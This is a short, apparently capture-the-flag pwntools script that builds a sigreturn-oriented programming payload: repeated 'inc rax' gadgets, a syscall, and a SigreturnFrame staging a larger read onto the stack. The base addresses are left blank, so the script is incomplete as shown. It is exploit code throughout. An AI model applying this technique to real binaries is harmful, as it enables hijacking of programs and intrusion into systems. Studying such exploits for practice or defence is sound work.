from pwn import *

context.arch = 'amd64'
exe_base = 
stack_ret = 

inc_rax = exe_base + 0x3c
syscall = exe_base + 0x36

read_frame = SigreturnFrame() # create bigger read cause inefficient inc rax
read_frame.rax = 0  # read
read_frame.rdi = 0  # stdin
read_frame.rsi = stack_ret + 376 # len of payload
read_frame.rdx = 1500
read_frame.r8 = 5
read_frame.rbp = stack_ret + 0x200
read_frame.rsp = stack_ret
read_frame.rip = syscall

payload = p64(inc_rax)*15
payload += p64(syscall)
payload += bytes(read_frame)
# print(len(payload))
